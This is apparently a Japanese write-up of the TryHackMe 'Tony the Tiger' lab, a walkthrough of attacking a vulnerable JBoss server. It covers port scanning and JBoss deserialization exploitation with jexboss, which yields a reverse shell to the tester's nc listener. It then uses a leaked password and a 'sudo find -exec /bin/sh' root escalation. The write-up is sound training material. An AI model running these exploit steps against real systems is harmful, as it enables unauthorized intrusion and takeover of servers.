# Tony the Tiger CTF

https://tryhackme.com/room/tonythetiger

Javaシリアライゼーション攻撃と書かれている。

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.137.88
root@ip-10-10-117-78:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-28 23:39 GMT
Nmap scan report for 10.10.137.88
Host is up (0.000078s latency).
Not shown: 65518 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1090/tcp open  ff-fms
1091/tcp open  ff-sm
1098/tcp open  rmiactivation
1099/tcp open  rmiregistry
3873/tcp open  fagordnc
4446/tcp open  n1-fwp
4712/tcp open  unknown
4713/tcp open  pulseaudio
5445/tcp open  smbdirect
5455/tcp open  apc-5455
5500/tcp open  hotline
5501/tcp open  fcp-addr-srvr2
8009/tcp open  ajp13
8080/tcp open  http-proxy
8083/tcp open  us-srv
MAC Address: 02:94:D7:7C:62:0D (Unknown)

root@ip-10-10-117-78:~# sudo nmap -sV -p22,80,1090,1091,1098,1099,3873,4446,4712,4713,5445,5455,5500,5501,8009,8080,8083 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-28 23:48 GMT
Nmap scan report for 10.10.137.88
Host is up (0.00012s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
1090/tcp open  java-rmi    Java RMI
1091/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
3873/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
4712/tcp open  msdtc       Microsoft Distributed Transaction Coordinator (error)
4713/tcp open  pulseaudio?
5445/tcp open  smbdirect?
5455/tcp open  apc-5455?
5500/tcp open  hotline?
5501/tcp open  tcpwrapped
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
8083/tcp open  http        JBoss service httpd
```

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30 -k

===============================================================
/categories           (Status: 301) [Size: 316] [--> http://10.10.137.88/categories/]
/css                  (Status: 301) [Size: 309] [--> http://10.10.137.88/css/]
/fonts                (Status: 301) [Size: 311] [--> http://10.10.137.88/fonts/]
/.htaccess.php        (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 288]
/.htaccess.txt        (Status: 403) [Size: 292]
/.htpasswd.txt        (Status: 403) [Size: 292]
/.htpasswd.php        (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 288]
/images               (Status: 301) [Size: 312] [--> http://10.10.137.88/images/]
/js                   (Status: 301) [Size: 308] [--> http://10.10.137.88/js/]
/page                 (Status: 301) [Size: 310] [--> http://10.10.137.88/page/]
/posts                (Status: 301) [Size: 311] [--> http://10.10.137.88/posts/]
/server-status        (Status: 403) [Size: 292]
/sitemap.xml          (Status: 200) [Size: 661]
/tags                 (Status: 301) [Size: 310] 
```

特筆するものはなし。

## Task4 トニーのフラグ

80ポートのブログにこういう記述があるため、画像ステガノがあると思われる。

```
I’m really shy though! So any photos I post must have a deeper meaning to them. But of course you wouldn’t know - you’re not me!
```

strings でフラグが出てきた。

```shell
$ strings -n 8 ./be2sOV9.jpg 
```

## Task6 JBoss エクスプロイト

Jboss Java Deserialization RCE (CVE-2015-7501)

ルームでは、zipファイルでペイロードが与えられている。  
しかし実行するとエラー発生。

```shell
$ python2 ./exploit.py --ysoserial-path ./ysoserial.jar 10.10.137.88:8080 id
[*] Target IP: 10.10.137.88
[*] Target PORT: 8080
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Error while generating or serializing payload
com.nqzero.permit.Permit$InitializationFailed: initialization failed, perhaps you're running with a security manager
        at com.nqzero.permit.Permit.setAccessible(Permit.java:22)
        at ysoserial.payloads.util.Reflections.setAccessible(Reflections.java:17)
        at ysoserial.payloads.CommonsCollections5.getObject(CommonsCollections5.java:83)
        at ysoserial.payloads.CommonsCollections5.getObject(CommonsCollections5.java:51)
        at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
Caused by: com.nqzero.permit.Permit$FieldNotFound: field "override" not found
        at com.nqzero.permit.Permit.<init>(Permit.java:222)
        at com.nqzero.permit.Permit.build(Permit.java:117)
        at com.nqzero.permit.Permit.<clinit>(Permit.java:16)
        ... 4 more
Traceback (most recent call last):
  File "./exploit.py", line 63, in <module>
    gadget = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections5', args.command])
  File "/usr/lib/python2.7/subprocess.py", line 223, in check_output
    raise CalledProcessError(retcode, cmd, output=output)
subprocess.CalledProcessError: Command '['java', '-jar', './ysoserial.jar', 'CommonsCollections5', 'id']' returned non-zero exit status 70
```

Java8にバージョンを落とすと動くようだが、環境を作るのが簡単ではないので、他の方法を探す。

https://www.exploit-db.com/exploits/44552 は機能しなかった。詳細不明。

jexboss が機能した。

```shell
$ git clone https://github.com/joaomatosf/jexboss.git
Cloning into 'jexboss'...
remote: Enumerating objects: 295, done.
remote: Total 295 (delta 0), reused 0 (delta 0), pack-reused 295 (from 1)
Receiving objects: 100% (295/295), 4.10 MiB | 7.98 MiB/s, done.
Resolving deltas: 100% (173/173), done.

$ cd jexboss 

$ pip install -r requires.txt
Collecting urllib3>=1.8 (from -r requires.txt (line 1))
  Downloading urllib3-2.3.0-py3-none-any.whl.metadata (6.5 kB)
Collecting ipaddress (from -r requires.txt (line 2))
  Downloading ipaddress-1.0.23-py2.py3-none-any.whl.metadata (923 bytes)
Downloading urllib3-2.3.0-py3-none-any.whl (128 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 128.4/128.4 kB 1.6 MB/s eta 0:00:00
Downloading ipaddress-1.0.23-py2.py3-none-any.whl (18 kB)
Installing collected packages: ipaddress, urllib3
Successfully installed ipaddress-1.0.23 urllib3-2.3.0
```

実行。よくわからないが、最初の質問でyesを選択するとエラー終了するので注意。

```shell
python jexboss.py -host http://10.10.137.88:8080

 * --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |  * And others Java Deserialization Vulnerabilities * | 
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#

 @version: 1.2.4

 * Checking for updates in: http://joaomatosf.com/rnp/releases.txt **


 ** Checking Host: http://10.10.137.88:8080 **

 [*] Checking jmx-console:                 
  [ VULNERABLE ]
 [*] Checking web-console:                 
  [ OK ]
 [*] Checking JMXInvokerServlet:           
  [ VULNERABLE ]
 [*] Checking admin-console:               
  [ EXPOSED ]
 [*] Checking Application Deserialization: 
  [ OK ]
 [*] Checking Servlet Deserialization:     
  [ OK ]
 [*] Checking Jenkins:                     
  [ OK ]
 [*] Checking Struts2:                     
  [ OK ]


 * Do you want to try to run an automated exploitation via "jmx-console" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? no


 * Do you want to try to run an automated exploitation via "JMXInvokerServlet" ?
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? yes

 * Sending exploit code to http://10.10.137.88:8080. Please wait...

 * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.
   OBS: You can also use the --cmd "command" to send specific commands to run on the server.
   IP Address (RHOST): 10.2.22.182
   Port (RPORT): 6666

 * The exploit code was successfully sent. Check if you received the reverse shell
   connection on your server or if your command was executed.                                                       
   Type [ENTER] to continue...
```

リバースシェル取得成功

```shell
$ nc -nvlp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.137.88] 34880
bash: cannot set terminal process group (816): Inappropriate ioctl for device
bash: no job control in this shell
cmnatic@thm-java-deserial:/$ 
```

note

```shell
cmnatic@thm-java-deserial:/home/jboss$ cat note
cat note
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss

Kind Regards,
CMNatic
```

ヒストリーにフラグが出ていた。

```shell
cmnatic@thm-java-deserial:/home/jboss$ cat .bash_history
cat .bash_history
touch jboss.txt
echo "THM{フラグ}" > jboss.txt
mv jboss.txt .jboss.txt
exit
sudo -l
exit
ls
ls -lah
nano .bash_history
ls
cd ~
ls
nano .bash_history 
exit
```

## 権限昇格

```shell
cmnatic@thm-java-deserial:~$ cat to-do.txt
cat to-do.txt
I like to keep a track of the various things I do throughout the day.

Things I have done today:
 - Added a note for JBoss to read for when he next logs in.
 - Helped Tony setup his website!
 - Made sure that I am not an administrator account 

Things to do:
 - Update my Java! I've heard it's kind of in-secure, but it's such a headache to update. Grrr!
```

SUID

```shell
cmnatic@thm-java-deserial:/home/jboss$ find / -perm -u=s -type f -ls 2>/dev/null
917563   96 -rwsr-xr-x   1 root     root        94792 Nov 23  2016 /bin/mount
917577   44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6
917596   40 -rwsr-xr-x   1 root     root        36936 May 17  2017 /bin/su
917576   44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping
917627   32 -rwsr-xr-x   1 root     root        30800 May 15  2015 /bin/fusermount
917604   68 -rwsr-xr-x   1 root     root        69120 Nov 23  2016 /bin/umount
  2825   24 -rwsr-xr-x   1 root     root        23304 Mar 27  2019 /usr/bin/pkexec
   168   44 -rwsr-xr-x   1 root     root        41336 May 17  2017 /usr/bin/chsh
   425  152 -rwsr-xr-x   1 root     root       155008 May 29  2017 /usr/bin/sudo
   320   48 -rwsr-xr-x   1 root     root        47032 May 17  2017 /usr/bin/passwd
 11493   52 -rwsr-sr-x   1 daemon   daemon      51464 Oct 21  2013 /usr/bin/at
 11266   76 -rwsr-xr-x   1 root     root        75256 Oct 21  2013 /usr/bin/mtr
 11235   24 -rwsr-xr-x   1 root     root        23104 May  7  2014 /usr/bin/traceroute6.iputils
   308   36 -rwsr-xr-x   1 root     root        36592 May 17  2017 /usr/bin/newgrp
   239   72 -rwsr-xr-x   1 root     root        72280 May 17  2017 /usr/bin/gpasswd
   165   48 -rwsr-xr-x   1 root     root        46424 May 17  2017 /usr/bin/chfn
 11333  340 -rwsr-xr--   1 root     dip        347296 Jun 12  2018 /usr/sbin/pppd
 11392   20 -rwsr-sr-x   1 libuuid  libuuid     18904 Nov 23  2016 /usr/sbin/uuidd
   516   12 -rwsr-xr-x   1 root     root        10240 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
  2821   16 -rwsr-xr-x   1 root     root        14808 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
 11315  432 -rwsr-xr-x   1 root     root       440416 Mar  4  2019 /usr/lib/openssh/ssh-keysign
135091   16 -r-sr-xr-x   1 root     root        14320 Mar  4  2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
135134   16 -r-sr-xr-x   1 root     root        13628 Mar  4  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
402362  304 -rwsr-xr--   1 root     messagebus   310800 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

mtr で読めるかと思ったが失敗した。

```shell
cmnatic@thm-java-deserial:/home/jboss$ mtr --raw --filename=/root/root.txt
mtr --raw --filename=/root/root.txt
mtr: fopen: Permission denied
```

note にパスワード変更について書かれていたのでユーザー変更。

```shell
cmnatic@thm-java-deserial:/home/jboss$ su jboss
su jboss
Password: likeaboss

jboss@thm-java-deserial:~$ 
```

```shell
jboss@thm-java-deserial:~$ sudo -l
sudo -l
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
```

sudo find を実行できる。

```shell
jboss@thm-java-deserial:~$ sudo find . -exec /bin/sh \; -quit
sudo find . -exec /bin/sh \; -quit
# 
```

ルート昇格成功。

```shell
# ls /root
ls /root
root.txt
# cat /root/root.txt
cat /root/root.txt
ひみつ==
```

Base64デコード後、MD5としてパスワードクラック可能。


## 振り返り

- jexboss に限らず、デシリアライズ攻撃は技術的に高度で内容を理解するのは難しい。
- JBossに出くわしたら試す価値があるので覚えておく。
